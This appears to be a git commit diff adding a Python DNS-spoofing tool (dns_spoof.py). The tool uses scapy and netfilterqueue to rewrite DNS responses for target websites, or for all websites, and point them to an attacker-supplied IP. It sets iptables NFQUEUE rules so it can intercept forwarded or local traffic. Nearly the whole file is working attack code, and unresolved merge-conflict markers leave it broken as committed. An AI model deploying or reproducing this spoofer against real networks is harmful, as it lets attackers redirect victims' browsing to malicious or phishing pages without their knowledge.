fec0b7e22c7b5b6f6633ab87a9f2e06342df2805
root <root@localhost.localdomain>
2020-05-13 19:46:25 +0400

    Argparse update

---
+++ dns_spoof.py
@@ -0,0 +1,91 @@
+import netfilterqueue
+import scapy.all as scapy
+import subprocess
+import argparse
+<<<<<<< HEAD
+import requests
+=======
+>>>>>>> e01080b... Argparse update
+from colorama import init, Fore
+
+GREEN  = Fore.GREEN
+RED    = Fore.RED
+YELLOW = Fore.YELLOW
+
+
+def get_arguments():
+    parser = argparse.ArgumentParser(description='DNS Spoof against target computer , to redirect WEB pages on Local IP')
+    parser.add_argument('-p' , '-ip' , nargs='?' ,  dest='ip' , help='Spoof the DNS query packets of a certain IP address' , required=True)
+    parser.add_argument('-t' , nargs='?' , dest='target' , help='Target Websites , ex: example.com  OR example.com,example2.com')
+    parser.add_argument('-all'  , dest='all', action='store_const', const=True , help='Target All Websites')
+    parser.add_argument('-local', dest='local', action='store_const', const=True , help='Spoof in your Computer , default=target')
+    args = parser.parse_args()
+    if args.target==None and args.all==None:
+        parser.error('the following arguments are required: -t/-all')
+    else:
+        return args
+
+
+<<<<<<< HEAD
+=======
+        
+>>>>>>> e01080b... Argparse update
+def change_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer('DNS Resource Record'):
+        WebHost = scapy_packet[scapy.DNSQR].qname.decode()
+
+        for TargetHost in arr:
+            if TargetHost in  WebHost:
+                print(f'{GREEN} [+] Spoofed {RED} {TargetHost}  {YELLOW} To  {result.ip}') 
+                spoof = scapy.DNSRR(rrname=WebHost , rdata=result.ip)
+                scapy_packet[scapy.DNS].an = spoof
+                scapy_packet[scapy.DNS].ancount = 1
+
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.UDP].len
+                del scapy_packet[scapy.UDP].chksum
+                
+                packet.set_payload(bytes(scapy_packet))
+
+<<<<<<< HEAD
+              #  print(scapy_packet.show())
+=======
+                print(scapy_packet.show())
+>>>>>>> e01080b... Argparse update
+                
+
+    packet.accept()
+    
+
+def process():
+    if result.local:
+        commandone = 'iptables -I OUTPUT -j NFQUEUE --queue-num 0'
+        commandtwo = 'iptables -I INPUT -j NFQUEUE --queue-num 0'
+        subprocess.run([commandone] , shell=True)
+        subprocess.run([commandtwo] , shell=True)
+    else:
+        command = 'iptables -I FORWARD -j NFQUEUE --queue-num 0'
+        subprocess.run([command] , shell=True)
+
+    try:
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(0 , change_packet)
+        queue.run()
+    except:
+        command = 'iptables --flush'
+        subprocess.run([command] , shell=True)
+
+result = get_arguments()
+arr = list()
+if result.target:
+    arr = (result.target.split(','))
+    process()
+elif result.all:
+    arr = ['']
+    process()
+
+
+
+
